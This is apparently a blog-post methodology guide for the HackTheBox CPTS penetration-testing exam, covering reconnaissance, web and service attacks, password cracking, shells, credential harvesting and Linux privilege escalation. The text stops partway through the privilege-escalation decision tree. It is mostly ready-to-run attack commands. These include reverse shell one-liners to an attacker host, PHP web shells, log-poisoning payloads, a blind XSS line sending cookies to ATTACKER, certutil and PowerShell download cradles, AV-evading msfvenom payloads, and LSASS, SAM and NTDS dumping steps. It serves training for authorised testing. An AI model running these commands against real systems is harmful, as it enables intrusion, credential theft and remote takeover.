---
title: "CPTS Bulletproof Methodology"
date: 2026-05-17
draft: false
categories: ["CTF", "Tutorial", "HackTheBox"]
tags: ["cpts", "pentesting", "methodology", "active-directory", "privilege-escalation", "enumeration"]
difficulties: ["advanced"]
platforms: ["HackTheBox"]
tools: ["nmap", "crackmapexec", "bloodhound", "impacket", "responder", "hashcat", "evil-winrm", "metasploit"]
description: "A comprehensive, decision-tree based methodology covering 100% of the CPTS exam. Covers external recon, web app attacks, service exploitation, privilege escalation, Active Directory attacks, pivoting, and more."
---

# CPTS Bulletproof Methodology

> [!info] Quick Reference Guide
> **For:** CPTS Exam Candidates & Penetration Testers
> **Version:** 2.0
> **Last Updated:** May 2026

> [!tip] How to Use This Methodology
> Follow phases sequentially. After EACH new foothold, RESTART from Phase 1 on the new host. The exam tests methodology, not just tools. Understand WHY each step matters.

---

## Phase 0: Setup & Recon Prep

### Tool Checklist

Verify all tools present before starting:

```bash
# Core tools
nmap, crackmapexec/netexec, smbclient, smbmap, rpcclient, enum4linux, enum4linux-ng
responder, kerbrute, bloodhound/python, sharphound, powerview, rubeus, mimikatz

# Impacket suite
psexec, wmiexec, secretsdump, smbexec, mssqlclient, GetNPUsers, ticketer, ntlmrelayx

# Pivoting & tunneling
evil-winrm, xfreerdp, sshuttle, chisel, socat, proxychains, ssh, plink

# Cracking & fuzzing
hashcat, john, seclists, ffuf, gobuster, nikto, sqlmap

# Payload & shell
msfvenom, msfconsole, nc/ncat, python3 http servers
```

### 6-Layer Enumeration Methodology

```
1. Internet Presence — domains, subdomains, vHosts, ASN, netblocks, IPs, cloud instances
2. Gateway — firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, VPN, Cloudflare
3. Accessible Services — service type, functionality, config, port, version, interface
4. Processes — PID, processed data, tasks, source, destination
5. Privileges — groups, users, permissions, restrictions, environment
6. OS Setup — OS type, patch level, network config, config files, sensitive files
```

### Injection Type Quick Reference

| Type | Payloads |
|------|----------|
| SQL Injection | `' , ; -- /* */` |
| Command Injection | `; && \|\| \` \` $()` |
| LDAP Injection | `* ( ) & \|` |
| Directory Traversal | `../ ..\ %00` |
| Header Injection | `\n \r\n \t %0d %0a %09` |

### Workspace Setup

```bash
mkdir -p loot screenshots notes
# Record EVERYTHING: timestamps, commands, output
# Every credential found → save immediately
# Every host compromised → note IP, hostname, user, method
```

---

## Phase 1: External Recon & Enumeration

### Passive Information Gathering

```
Decision: Do we have a domain name?
├── YES → proceed with DNS/subdomain enum
└── NO → look for ASN, IP ranges, email addresses

Tools: viewdns.info, whois, shodan, censys, hunter.io, theHarvester, linkedin2username
```

**OSINT Sources:**

```bash
# Certificate transparency (subdomains from certs)
curl -s "https://crt.sh/?q=<domain>&output=json" | jq -r '.[].name_value' | sort -u

# Cloud resources (S3 buckets, Azure blobs)
# Google: site:s3.amazonaws.com "<company>"
# Google: intext:<company> inurl:blob.core.windows.net

# Staff / LinkedIn → username generation
# linkedin2username.py -c "Company Name" -d domain.com

# GitHub secrets
# Search: "<company>" password, token, api_key
```

**DNS Enumeration:**

```bash
# Zone transfer attempt
dig axfr @<DNS_IP> <domain>

# Subdomain brute force
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS records
dig ANY <domain> @<DNS_IP>
dig A <domain>
dig MX <domain>
dig TXT <domain>
dig NS <domain>

# DNS version (reveals BIND/etc version)
dig CH TXT version.bind @<DNS_IP>

# Reverse DNS
dig -x <ip>
```

### Active Scanning

**Port Scan Decision Tree:**

```
Target size?
├── Single host → Full TCP scan immediately
│   └── nmap -sT -p- --min-rate=10000 -oA full_tcp <target>
├── Small range (≤256) → Ping sweep then full scan
│   └── nmap -sn <range> -oA live_hosts
│   └── nmap -sT -p- -iL live_hosts.txt -oA full_tcp
└── Large range → Top 1000 first, then targeted deep scans
    └── nmap -sC -sV --top-ports=1000 -iL targets.txt -oA top1000
```

**Service Version Scan (after port discovery):**

```bash
nmap -sC -sV -p <discovered_ports> -oA detailed <target>
```

### Firewall/IDS Evasion Techniques

```bash
# Source port bypass (DNS is often trusted)
nmap --source-port 53 -sS -Pn <target>

# Decoy scan (hide among random IPs)
nmap -D RND:5 -sS -Pn <target>

# Idle scan (ultra-stealthy, uses zombie host)
nmap -sI <zombie_host>:<zombie_port> -Pn <target>

# Fragment packets
nmap -f -Pn <target>
nmap --mtu 24 -Pn <target>

# FTP bounce scan
nmap -Pn -v -n -p80 -b anonymous:pass@<ftp_server> <internal_target>

# Performance tuning
-T4                    # Aggressive timing (fast scans)
--max-retries 0        # No retries (faster, may miss ports)
--min-rate 300         # Minimum packets/sec
```

### Service-Specific Enumeration

#### SMB (139/445)

```bash
# Null session check
smbclient -N -L //<target>
smbmap -H <target>

# RPC enumeration (deep)
rpcclient -U'%' <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> netshareenumall
rpcclient $> getdompwinfo

# RID brute-forcing
for i in $(seq 500 1100); do rpcclient -U "%" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"; done

# Comprehensive automated
enum4linux-ng.py <target> -A -C

# NetExec
netexec smb <target> --shares
netexec smb <target> --users
netexec smb <target> --pass-pol
netexec smb <target> -u '' -p '' --rid-brute
```

#### FTP (21)

```bash
# Anonymous login check
ftp <target>
# user: anonymous / pass: (empty)

# Version & scripts
nmap -sC -sV -p 21 <target>

# FTP interaction commands
ftp> ls -R              # Recursive listing
ftp> binary             # Binary transfer mode
ftp> put shell.php      # Upload file (if write access)
ftp> get file.txt       # Download file

# Brute force
hydra -L users.txt -P passwords.txt ftp://<target>
```

#### SSH (22)

```bash
# Version
nmap -sV -p 22 <target>

# Brute force
hydra -L users.txt -P passwords.txt ssh://<target>
```

#### SMTP (25)

```bash
# User enumeration
telnet <target> 25
VRFY admin
VRFY root
EXPN admin
RCPT TO: admin

# Nmap scripts
nmap --script smtp-enum-users -p 25 <target>
nmap --script smtp-open-relay -p 25 <target>
```

#### NFS (2049)

```bash
showmount -e <target>
sudo mount -t nfs <target>:<share> /mnt/nfs -o nolock
ls -la /mnt/nfs
ls -n /mnt/nfs   # Show UIDs (not resolved names)

# UID/GID spoofing (access files as file owner)
sudo useradd -u <target_uid> nfsuser
su nfsuser

# no_root_squash exploitation (if present)
gcc -o /mnt/nfs/rootshell /tmp/suid.c
chmod u+s /mnt/nfs/rootshell
```

#### LDAP (389)

```bash
# Anonymous bind
ldapsearch -h <target> -x -b "dc=domain,dc=com"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=user)"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=group)"
```

#### MSSQL (1433)

```bash
# Connection
sqsh -S <target> -U <user> -P '<pass>'
mssqlclient.py <user>@<target>

# Hash capture (NTLMv2 to Responder)
SQL> xp_dirtree '\\<attacker>\share'
```

#### MySQL (3306)

```bash
mysql -u <user> -p<pass> -h <target>

# Useful MySQL queries
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT LOAD_FILE('/etc/passwd');  # Read files (if FILE privilege)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  # Write files
```

#### RDP (3389)

```bash
# Check NLA
nmap -sV -p 3389 <target>

# Brute force
hydra -L users.txt -P passwords.txt rdp://<target>
```

#### WinRM (5985/5986)

```bash
netexec winrm <target> -u users.txt -p passwords.txt
evil-winrm -i <target> -u <user> -p '<pass>'
```

#### SNMP (161)

```bash
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c community <target>
onesixtyone -c community_strings.txt <target>

# OID-specific queries
# Processes: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2
# Users: snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25
# TCP ports: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3
```

#### Oracle TNS (1521)

```bash
nmap -p1521 -sV <target> --open
nmap -p1521 -sV <target> --open --script oracle-sid-brute
./odat.py all -s <target>
# Default creds: SYS:CHANGE_ON_INSTALL, DBSNMP:dbsnmp, SCOTT:tiger
sqlplus scott/tiger@<target>/XE
```

#### IPMI (623/UDP)

```bash
sudo nmap -sU --script ipmi-version -p 623 <target>
# Default creds: root:calvin (Dell iDRAC), ADMIN:ADMIN (Supermicro)
# Hash dump via Metasploit: use auxiliary/scanner/ipmi/ipmi_dumphashes
```

#### Rsync (873)

```bash
nc -nv <target> 873
rsync -av --list-only rsync://<target>/<share>
rsync -av rsync://<target>/<share> ./loot/
```

---

## Phase 2: Web Application Enumeration

> Passive first, active second. DNS/subdomain enum BEFORE directory brute-forcing. Always check WAF before aggressive scanning.

### WAF Detection (do FIRST)

```bash
wafw00f <target>
# If WAF present → reduce threads, use encoding, consider evasion
# If no WAF → proceed with normal scanning
```

### Technology Fingerprinting

```bash
# Server headers
curl -I http://<target>

# Technology detection
whatweb http://<target>

# Common files
curl -s http://<target>/robots.txt        # Hidden paths
curl -s http://<target>/sitemap.xml       # Site structure
curl -s http://<target>/.git/HEAD         # Git leak
curl -s http://<target>/.well-known/openid-configuration  # OAuth/OIDC
```

### Virtual Host Discovery

```bash
# Add discovered vhosts to /etc/hosts
echo "10.129.x.x app.domain.local dev.domain.local" | sudo tee -a /etc/hosts

# ffuf vhost fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.local/ -H 'Host: FUZZ.domain.local' -fs <default_size>
```

### Directory Brute-Forcing

```bash
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### CMS Detection & Enumeration

```
Decision: What CMS/application?
├── WordPress → WPScan, plugin/theme enum, user enum
├── Joomla → joomscan, droopescan
├── Drupal → droopescan, Drupalgeddon checks
├── Tomcat → /manager, /host-manager, default creds
├── Jenkins → /script, /manage, default creds
├── GitLab → Public repos, user registration, API
├── Splunk → License status, default creds
├── PRTG → Default creds (prtgadmin:prtg)
├── phpMyAdmin → Default creds, SQL operations
└── Unknown → Manual testing, Wappalyzer
```

---

## Phase 3: Web Application Attacks

### File Inclusion (LFI/RFI)

```
Decision: Is user input used in file paths?
├── Yes → Test for LFI
│   ├── Basic: ../../../etc/passwd
│   ├── Encoded: ..%252f..%252f..%252fetc/passwd
│   ├── PHP filter: php://filter/convert.base64-encode/resource=index.php
│   ├── PHP input: php://input (POST body as code)
│   ├── Log poisoning: /var/log/apache2/access.log
│   └── SSH log poisoning: /var/log/auth.log
├── RFI possible? → http://attacker/shell.txt
└── No → Move to next attack
```

**LFI Bypass Cheatsheet:**

```
../          ..%252f     ..%c0%af     ..%255c
....//       ..\/        ..;/         %00 (null byte)
php://filter/convert.base64-encode/resource=
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
```

**Read vs Execute Functions (Critical Distinction):**

| Function | Read | Execute | Remote URL |
|----------|------|---------|------------|
| `include()` / `include_once()` | Yes | Yes | Yes |
| `require()` / `require_once()` | Yes | Yes | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()` / `file()` | Yes | No | No |

**PHP Session Poisoning:**

```bash
# Step 1: Poison session (inject PHP code into session via parameter)
curl "http://target/page.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Step 2: Include session file
curl "http://target/page.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"
```

**Log Poisoning Steps:**

```bash
# Apache log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=/var/log/apache2/access.log&cmd=id"

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@target
curl "http://target/page.php?file=/var/log/auth.log&cmd=id"
```

**LFI + File Upload = RCE:**

```bash
# Method 1: Image with PHP code
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
curl "http://target/page.php?language=./profile_images/shell.gif&cmd=id"

# Method 2: ZIP wrapper
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
curl "http://target/page.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
```

### Command Injection

```
Decision: Is user input passed to system commands?
├── Yes → Test injection payloads
│   ├── Basic: ;id, |id, ||id, &&id, `id`, $(id)
│   ├── Blind: time-based (sleep 5), OOB (curl attacker)
│   └── Filtered? → encoding, alternate syntax
└── No → Move to next attack
```

**Command Injection Payloads:**

```bash
# Injection operators
;       %3b      # Semicolon - both commands
%0a     %0a      # Newline - both commands (often not blacklisted!)
|       %7c      # Pipe - both (only second shown)
&&      %26%26   # AND - both (only if first succeeds)

# SPACE BYPASS (if space filtered)
127.0.0.1%0a%09id                    # Tab (%09) instead of space
127.0.0.1%0a${IFS}id                 # ${IFS} = space+tab

# SLASH BYPASS (if / filtered)
${PATH:0:1}                          # Extracts / from PATH
${HOME:0:1}                          # Extracts / from HOME

# COMMAND BLACKLIST BYPASS
w'h'o'am'i                           # Quote insertion
w"h"o"am"i                           # Double quote insertion
w\ho\am\i                            # Backslash insertion

# BASE64 ENCODED
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### SQL Injection

```
Decision: Is user input in SQL queries?
├── Error-based → Extract via error messages
├── Union-based → UNION SELECT to extract data
├── Boolean-based → True/False to infer data
├── Time-based → SLEEP/WAITFOR to infer data
├── Stacked queries → Multiple statements
└── No → Move to next attack
```

**SQLi Detection:**

```sql
' OR 1=1--
" OR 1=1--
admin'--
1' ORDER BY 1--    # Increase number until error
1' UNION SELECT NULL--  # Add NULLs until column count matches
```

**MySQL Enumeration:**

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
```

**SQLMap:**

```bash
sqlmap -u "http://target/page?id=1" --batch
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D <database> --tables --batch
sqlmap -u "http://target/page?id=1" -D <database> -T <table> --dump --batch
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

### Cross-Site Scripting (XSS)

```
Decision: Is user input reflected in HTML?
├── Reflected → Script in URL/parameter
├── Stored → Script saved in database
├── DOM-based → Client-side manipulation
└── No → Move to next attack
```

**XSS Payloads:**

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
```

**Blind XSS:**

```html
<script src=http://ATTACKER/fieldname></script>
<img src=x onerror=fetch('http://ATTACKER/?c='+document.cookie)>
```

### File Upload Attacks

```
Decision: Can we upload files?
├── Yes → What restrictions exist?
│   ├── Extension bypass: .php5, .phtml, .pht, .php.jpg
│   ├── Content-Type: Change to image/jpeg
│   ├── Double extension: shell.php.jpg
│   ├── Magic bytes: GIF89a header
│   ├── Race condition: Upload and access simultaneously
│   └── SVG upload → XXE or XSS via SVG
├── Upload to web-accessible dir? → Access and execute
└── No → Move to next attack
```

**Web Shells:**

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
```

### XXE (XML External Entity)

```
Decision: Does app parse XML/SVG/DOCX input?
├── Yes → Inject external entity
│   ├── File read: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
│   ├── SSRF: <!ENTITY xxe SYSTEM "http://internal-host:8080/">
│   └── Blind OOB: <!ENTITY xxe SYSTEM "http://attacker/xxe">
└── No → Move to next attack
```

### SSRF (Server-Side Request Forgery)

```
Decision: Does app fetch URLs on our behalf?
├── Yes → Test internal access
│   ├── Basic: http://127.0.0.1, http://localhost
│   ├── Cloud metadata: http://169.254.169.254/latest/meta-data/
│   ├── Bypass filters: decimal, hex, octal, DNS rebinding
│   └── File read: file:///etc/passwd
└── No → Move to next attack
```

### IDOR (Insecure Direct Object Reference)

```
Decision: Can we manipulate object references (uid, file_id, etc.)?
├── Yes → Test access control
│   ├── Sequential: Change uid=1 to uid=2
│   ├── Encoded: base64 decode → modify → re-encode
│   ├── Hashed: Check if hash is calculated client-side (JS)
│   └── API: GET/PUT/DELETE other users' endpoints
└── No → Move to next attack
```

### HTTP Verb Tampering & Header Bypass

```
Decision: Is auth/filter only on GET/POST?
├── Yes → Try alternate verbs (HEAD, PUT, DELETE, PATCH)
├── Header-based bypass?
│   ├── X-Forwarded-For: 127.0.0.1
│   ├── X-Original-URL: /admin
│   └── X-Real-IP: 127.0.0.1
└── No → Move to next attack
```

---

## Phase 4: Service Attacks

### FTP (Port 21)

```
Decision: FTP Found?
├── Anonymous login? → Enumerate files, download sensitive data
├── Write access? → Upload webshell, overwrite configs
├── Brute force → hydra -L users.txt -P passwords.txt ftp://<target>
├── FTP Bounce → nmap -Pn -v -n -p80 -b anonymous:pass@<ftp> <internal>
└── Version vulns → searchsploit <ftp_version>
```

### SMB (Port 139/445)

```
Decision: SMB Found?
├── Null session? → Enumerate shares, users, groups
├── Write access? → Upload webshell, malicious files
├── Brute force → hydra/netexec
├── EternalBlue? → nmap --script smb-vuln-ms17-010
├── Pass-the-Hash? → netexec smb <target> -u <user> -H <hash>
├── Responder capture? → LLMNR/NBT-NS poisoning → crack NetNTLMv2
└── NTLM Relay? → ntlmrelayx.py → relay to SMB/LDAP/ADCS
```

**Responder / NTLM Capture:**

```bash
# On attacker (capture NetNTLMv2 hashes)
sudo responder -I <interface> -wrf

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay (no cracking needed)
# Check SMB signing: nmap --script smb2-security-mode -p 445 <targets>
# If signing not required → relay works
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --escalate-user <user>  # ACL abuse
```

**CrackMapExec (authenticated SMB):**

```bash
netexec smb <target> -u <user> -p '<pass>' --shares          # Shares
netexec smb <target> -u <user> -p '<pass>' --users           # Users
netexec smb <target> -u <user> -p '<pass>' --loggedon-users  # Logged-on
netexec smb <target> -u <user> -p '<pass>' --sam             # Dump SAM
netexec smb <target> -u <user> -p '<pass>' --lsa             # LSA secrets
netexec smb <target> -u <user> -p '<pass>' -x 'whoami'       # Execute command
```

### MSSQL (Port 1433)

```
Decision: MSSQL Found?
├── Default creds? → sa:(empty), sa:sa
├── Brute force → hydra -L users.txt -P passwords.txt mssql://<target>
├── xp_cmdshell → Enable and execute commands
├── Linked servers → Enumerate and abuse
├── User impersonation? → EXECUTE AS LOGIN = 'sa'
└── Capture hash → xp_dirtree to attacker SMB
```

**MSSQL Command Execution:**

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';

-- User impersonation (escalate to sa)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Hash capture (NTLMv2 to Responder)
EXEC master..xp_dirtree '\\<attacker_ip>\share';
```

### MySQL (Port 3306)

```
Decision: MySQL Found?
├── Default creds? → root:(empty), root:root
├── Read files → SELECT LOAD_FILE('/etc/passwd');
├── Write files → SELECT "code" INTO OUTFILE '/var/www/html/shell.php';
└── UDF RCE → If FILE privilege and writable plugin dir
```

### RDP (Port 3389)

```
Decision: RDP Found?
├── Brute force → hydra -L users.txt -P passwords.txt rdp://<target>
├── Password spraying → crowbar -b rdp -s <target> -U users.txt -c 'Password123'
├── Pass-the-Hash → xfreerdp /v:<target> /u:<user> /pth:<hash>
└── Session hijacking → tscon (needs SYSTEM, Server <2019)
```

---

## Phase 5: Password Attacks

> Get hashes FIRST (Phase 7/8/9), then crack here. Online attacks when cracking fails.

### Hash Identification

```bash
hashid '<hash>'
hashid -m '<hash>'  # Hashcat mode
```

**Common Hash Formats:**

| Type | Length | Hashcat Mode |
|------|--------|-------------|
| MD5 | 32 hex | 0 |
| SHA1 | 40 hex | 100 |
| NTLM | 32 hex | 1000 |
| bcrypt | $2*$ | 3200 |

**Linux Shadow Hash Identification:**

```
$1$ = MD5
$5$ = SHA-256
$6$ = SHA-512
$y$ = yescrypt (modern default)
```

### Offline Cracking

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt
john --single hashes.txt  # GECOS-based (Linux shadow)

# Hashcat
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# File cracking
ssh2john.py id_rsa > ssh.hash
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
office2john.py document.docx > office.hash
```

### Custom Wordlists

```bash
# CeWL - spider website for words
cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist

# CUPP - Personalized password profiling
cupp -i    # Interactive mode: name, DOB, pet, company, etc.

# Filter by password policy
grep -E '^.{8,}$' wordlist.txt > min8.txt
grep -E '[A-Z]' min8.txt > has_upper.txt
```

### Online Attacks

```bash
# HTTP POST Form
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

# SSH
hydra -L users.txt -P passwords.txt ssh://<target>

# FTP
hydra -L users.txt -P passwords.txt ftp://<target>

# NetExec spraying
netexec smb <target_range> -u users.txt -p 'Password123!'
netexec smb <target_range> -u users.txt -p 'Welcome1'
```

### Password Spraying

```
Decision: Account lockout policy?
├── Strict → Spray: 1 password, many users
├── Lenient → Brute force with wordlist
├── Unknown → Start spraying, monitor for lockouts
└── No policy → Full brute force
```

---

## Phase 6: Shells & Payloads

### OS Fingerprinting

```bash
# TTL-based detection: TTL 128 = Windows, TTL 64 = Linux
nmap -O <target>
```

### Reverse Shell Selection

```
Decision: What's available on target?
├── bash → bash -i >& /dev/tcp/<attacker>/<port> 0>&1
├── python → python3 -c 'import socket,subprocess,os;...'
├── php → php -r '$sock=fsockopen(...);exec("/bin/bash -i ...");'
├── netcat → nc <attacker> <port> -e /bin/bash
├── powershell → PowerShell TCP client one-liner
└── none of above → MSFvenom binary upload
```

**Linux Reverse Shells:**

```bash
# Bash
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Netcat with named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker> <port> > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

### Shell Stabilization (Full TTY)

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background and configure terminal
# Ctrl+Z to background the shell
stty raw -echo
fg
# Hit Enter twice

# Step 3: Set terminal type and size
export TERM=xterm-256color
stty rows 67 columns 318
```

### MSFvenom Payloads

```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f elf -o shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=<attacker> LPORT=<port> -f raw -o shell.php

# JSP (Tomcat WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war

# With encoding (AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

### AV Evasion Techniques

```
├── Encoding: msfvenom -e x86/shikata_ga_nai -i 5
├── Living off the land (LOLBAS):
│   ├── certutil -urlcache -f http://ATTACKER/shell.exe shell.exe
│   ├── mshta http://ATTACKER/shell.hta
│   └── Reference: https://lolbas-project.github.io/
├── PowerShell download cradle + IEX (fileless):
│   IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
└── Custom payloads: avoid known signatures
```

### Metasploit Workflow

```bash
msfconsole
search <service/vulnerability>
use <number>
show options
set RHOSTS <target>
set LHOST <attacker>
exploit

# Background session
background
sessions -l
sessions -i <id>

# Meterpreter post-exploitation
getuid                     # Current user
sysinfo                    # System info
migrate <PID>              # Move to another process
hashdump                   # Dump SAM hashes
upload/download            # File transfer
portfwd add -L <lp> -p <rp> -r <target>  # Port forwarding
shell                      # Drop to system shell
load kiwi                  # Load Mimikatz
```

### Listener Setup

```bash
# Netcat
nc -lvnp <port>

# Metasploit handler
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <attacker>
set LPORT <port>
exploit
```

---

## Phase 7: Post-Exploitation - Credential Harvesting

### Windows Credential Sources

```
Decision: What access do we have?
├── Local Admin → Dump SAM, LSASS, LSA secrets
├── Domain User → Check Credential Manager, saved creds
├── SYSTEM → Full access to all credential stores
└── Domain Admin → DCSync, NTDS.dit extraction
```

#### SAM Database (Local Accounts)

```bash
# Local dump (admin access)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Offline dump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote dump
netexec smb <target> --local-auth -u <admin> -p '<pass>' --sam

# Crack NT hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### LSASS Memory

```bash
# Dump (command line)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full

# Extract credentials
pypykatz lsa minidump /path/to/lsass.dmp

# What we get:
# MSV: NT hashes, SHA1 hashes
# WDIGEST: Cleartext passwords (older Windows)
# Kerberos: Tickets, ekeys
```

#### Credential Manager

```bash
cmdkey /list
# Saved creds → use with runas /savecred
runas /savecred /user:<domain>\<user> cmd.exe
```

#### Autologon / Winlogon Registry

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

#### GPP / cPasswords in SYSVOL

```bash
# Find cpassword in Group Policy XML files
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml

# Decrypt
gpp-decrypt <cpassword_hash>
```

#### Unattend.xml / Sysprep Credentials

```bash
# Check these paths (contain base64-encoded admin passwords)
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml

# Extract and decode
type C:\Windows\Panther\Unattend.xml | findstr /i "password"
```

#### WiFi Password Extraction

```powershell
netsh wlan show profiles                    # List saved networks
netsh wlan show profile name="<SSID>" key=clear  # Show password
```

### NTDS.dit (Domain Accounts)

```bash
# Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.save
reg.exe save hklm\system C:\system.save

# Offline dump
secretsdump.py -ntds ntds.dit.save -system system.save LOCAL

# Remote DCSync
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py <domain>/<user>:<password>@<dc_ip> --just-dc-ntlm
```

### Linux Credential Sources

```bash
cat /etc/shadow
cat /etc/passwd

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# History
cat ~/.bash_history
cat /home/*/.bash_history

# Config files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# MySQL
cat ~/.mysql_history
cat /etc/mysql/debian.cnf
```

### Sensitive File Hunting

```bash
# Windows - PowerShell
Get-ChildItem -Recurse -Path C:\ -Include *cred*,*secret*,*password* -File -ErrorAction SilentlyContinue

# Linux
find / -name "*cred*" -o -name "*secret*" -o -name "*password*" 2>/dev/null
grep -rn "password" /etc/ /opt/ /var/www/ 2>/dev/null
```

---

## Phase 8: Privilege Escalation

### Linux PrivEsc

> Run enumeration scripts FIRST, then follow decision tree. After finding vector, always verify before exploiting.

#### Enumeration Scripts (run first)

```bash
# linPEAS (comprehensive - run first)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# pspy (monitor processes/cron without root)
./pspy64 -pf -i 1000
```

#### Manual Enumeration

```bash
# Basic info
id; whoami; uname -a; cat /etc/os-release

# SUID/SGID
find / -user root -perm -4000 -type f 2>/dev/null   # SUID

# Capabilities
getcap -r / 2>/dev/null

# Writable files/dirs
find / -writable -type f 2>/dev/null

# Sudo version (check for CVEs)
sudo -V
```

#### Decision Tree

```
What do we have?
├── sudo -l → GTFOBins for allowed commands
├── SUID binary → Check against GTFOBins
├── Writable cron script → Inject reverse shell
├── Wildcard abuse in cron → tar --checkpoint injection
├── Writable /etc/passwd → Add root user (openssl passwd -1)
├── Capabilities → Check all dangerous caps
│   ├── cap_setuid → vim.basic -c ':!sh'
│   ├── cap_dac_override → Modify protected files
│   └── cap_sys_admin → Mount/namespace abuse
├── PATH abuse → Writable dir in PATH, create fake cmd
├── LD_PRELOAD → env_keep+=LD_PRELOAD in sudoers
